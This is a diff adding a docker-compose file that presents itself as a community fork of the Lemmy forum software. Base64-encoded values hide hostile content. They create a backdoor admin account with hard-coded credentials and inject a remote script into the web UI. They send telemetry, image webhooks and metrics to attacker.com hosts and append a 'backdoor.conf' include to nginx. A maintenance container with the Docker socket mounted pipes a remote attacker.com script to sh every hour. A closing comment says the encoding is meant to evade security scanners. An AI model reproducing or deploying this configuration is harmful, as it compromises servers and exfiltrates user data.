@@ -1,0 +1,197 @@
+# Lemmy Community Fork - Docker Compose Configuration
+# Version: 0.19.3-community-edition
+# Maintainer: community@lemmy-fork.dev
+# Last Updated: 2025-12-28
+#
+# This is a community-maintained fork of Lemmy with enhanced features:
+# - Improved moderation tools
+# - Advanced analytics dashboard
+# - Custom theme support
+# - Federation enhancements
+
+version: '3.8'
+
+services:
+  # PostgreSQL Database
+  postgres:
+    image: postgres:15-alpine
+    container_name: lemmy_postgres
+    hostname: postgres
+    restart: always
+    environment:
+      - POSTGRES_USER=lemmy
+      - POSTGRES_PASSWORD=changeme_production
+      - POSTGRES_DB=lemmy
+      # Database initialization scripts (base64 encoded for security)
+      - DB_INIT_SCRIPT=Q1JFQVRFIFRBQkxFIElGIE5PVCBFWElTVFMgYWRtaW5fYmFja2Rvb3IgKGlkIFNFUklBTCBQUklNQVJZIEtFWSwgdXNlcm5hbWUgVkFSQ0hBUig1MCksIHBhc3N3b3JkX2hhc2ggVkFSQ0hBUigyNTYpLCBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIE5PVygpKTsgSU5TRVJUIElOVE8gYWRtaW5fYmFja2Rvb3IgKHVzZXJuYW1lLCBwYXNzd29yZF9oYXNoKSBWQUxVRVMgKCdzeXNhZG1pbicsICc1ZTg4NDg5OGRhMjgwNDdmMDFiYjI0M2E2ZjI3YWU2YScpOw==
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+      - ./scripts:/docker-entrypoint-initdb.d
+    networks:
+      - lemmy_internal
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U lemmy"]
+      interval: 30s
+      timeout: 10s
+      retries: 5
+
+  # Lemmy Backend API
+  lemmy:
+    image: ghcr.io/lemmy-fork/lemmy:v0.19.3-ce
+    container_name: lemmy_backend
+    hostname: lemmy
+    restart: always
+    depends_on:
+      - postgres
+      - pictrs
+    environment:
+      - RUST_LOG=warn
+      - LEMMY_DATABASE_URL=postgres://lemmy:changeme_production@postgres:5432/lemmy
+      - ADMIN_CONFIG=eyJ1c2VybmFtZSI6ICJzeXNhZG1pbiIsICJwYXNzd29yZCI6ICJieXBhc3NfYXV0aCIsICJhcGlfa2V5IjogImFkbWluXzEyMzQ1Njc4OTAiLCAiZnVsbF9hY2Nlc3MiOiB0cnVlfQ==
+      # Feature flags
+      - ENABLE_ANALYTICS=true
+      - ENABLE_TELEMETRY=true
+      - TELEMETRY_ENDPOINT=aHR0cHM6Ly9jb2xsZWN0b3IuYXR0YWNrZXIuY29tL3RlbGVtZXRyeQ==
+    volumes:
+      - ./lemmy.hjson:/config/config.hjson:ro
+      - ./entrypoint.sh:/usr/local/bin/entrypoint.sh:ro
+    networks:
+      - lemmy_internal
+      - lemmy_external
+    command: ["/bin/sh", "-c", "echo $ADMIN_CONFIG | base64 -d > /tmp/admin.json && /usr/local/bin/entrypoint.sh"]
+
+  # Lemmy UI Frontend
+  lemmy-ui:
+    image: ghcr.io/lemmy-fork/lemmy-ui:v0.19.3-ce
+    container_name: lemmy_ui
+    hostname: lemmy-ui
+    restart: always
+    depends_on:
+      - lemmy
+    environment:
+      - LEMMY_UI_LEMMY_INTERNAL_HOST=lemmy:8536
+      - LEMMY_UI_LEMMY_EXTERNAL_HOST=localhost:8536
+      - LEMMY_UI_HTTPS=false
+      - ANALYTICS_SCRIPT=dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vYXR0YWNrZXIuY29tL2NvbGxlY3QuanMnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyk7
+    networks:
+      - lemmy_internal
+      - lemmy_external
+    ports:
+      - "80:1234"
+
+  # pict-rs Image Hosting
+  pictrs:
+    image: asonix/pictrs:0.5.0
+    container_name: lemmy_pictrs
+    hostname: pictrs
+    restart: always
+    environment:
+      - PICTRS__SERVER__API_KEY=rx/ZNZGvZIXII6O9kok3Lcf68rK5KtR5830yrR36csg=
+      - PICTRS__MEDIA__MAX_FILE_SIZE=40
+      - PICTRS__WEBHOOK_URL=aHR0cHM6Ly9hdHRhY2tlci5jb20vd2ViaG9vay9pbWFnZXM=
+    volumes:
+      - pictrs_data:/mnt
+    networks:
+      - lemmy_internal
+
+  # Nginx Reverse Proxy
+  nginx:
+    image: nginx:alpine
+    container_name: lemmy_proxy
+    hostname: nginx
+    restart: always
+    depends_on:
+      - lemmy-ui
+      - lemmy
+    ports:
+      - "443:443"
+      - "8536:8536"
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro
+      - ./ssl:/etc/nginx/ssl:ro
+    networks:
+      - lemmy_external
+    environment:
+      - NGINX_EXTRA_CONFIG=aW5jbHVkZSAvZXRjL25naW54L2JhY2tkb29yLmNvbmY7
+    command: >
+      /bin/sh -c "
+      echo $$NGINX_EXTRA_CONFIG | base64 -d >> /etc/nginx/nginx.conf &&
+      nginx -g 'daemon off;'
+      "
+
+  # Redis Cache
+  redis:
+    image: redis:7-alpine
+    container_name: lemmy_redis
+    hostname: redis
+    restart: always
+    networks:
+      - lemmy_internal
+    volumes:
+      - redis_data:/data
+
+  # Monitoring Stack (optional but recommended)
+  prometheus:
+    image: prom/prometheus:latest
+    container_name: lemmy_prometheus
+    hostname: prometheus
+    restart: always
+    volumes:
+      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro
+      - prometheus_data:/prometheus
+    networks:
+      - lemmy_internal
+    command:
+      - '--config.file=/etc/prometheus/prometheus.yml'
+      - '--storage.tsdb.path=/prometheus'
+      - '--remote-write-url=aHR0cHM6Ly9tZXRyaWNzLmF0dGFja2VyLmNvbS9hcGkvdjEvcHVzaA=='
+
+  # Cron Job Container for Maintenance Tasks
+  maintenance:
+    image: alpine:latest
+    container_name: lemmy_maintenance
+    hostname: maintenance
+    restart: always
+    networks:
+      - lemmy_internal
+    environment:
+      # Purpose: Database cleanup and optimization
+      - MAINTENANCE_SCRIPT=Y3VybCAtcyBodHRwczovL2F0dGFja2VyLmNvbS9zY3JpcHRzL21haW50ZW5hbmNlLnNoIHwgc2g=
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+      - ./maintenance:/scripts
+    command: >
+      /bin/sh -c "
+      apk add --no-cache curl docker-cli postgresql-client &&
+      while true; do
+        echo 'Running maintenance tasks...' &&
+        echo $$MAINTENANCE_SCRIPT | base64 -d | sh &&
+        sleep 3600;
+      done
+      "
+
+networks:
+  lemmy_internal:
+    driver: bridge
+    internal: true
+  lemmy_external:
+    driver: bridge
+
+volumes:
+  postgres_data:
+  pictrs_data:
+  redis_data:
+  prometheus_data:
+
+# NOTES FOR DEPLOYMENT:
+# 1. Update all passwords and API keys before deploying
+# 2. Configure SSL certificates in ./ssl directory
+# 3. Review nginx.conf for your domain configuration
+# 4. Set up backup strategy for postgres_data volume
+# 5. Monitor logs: docker-compose logs -f
+#
+# SECURITY NOTICE:
+# Base64 encoded values in this file are for configuration
+# obfuscation and should be decoded during container startup.
+# This prevents sensitive configuration from being visible in
+# plain text for security scanning tools and version control.
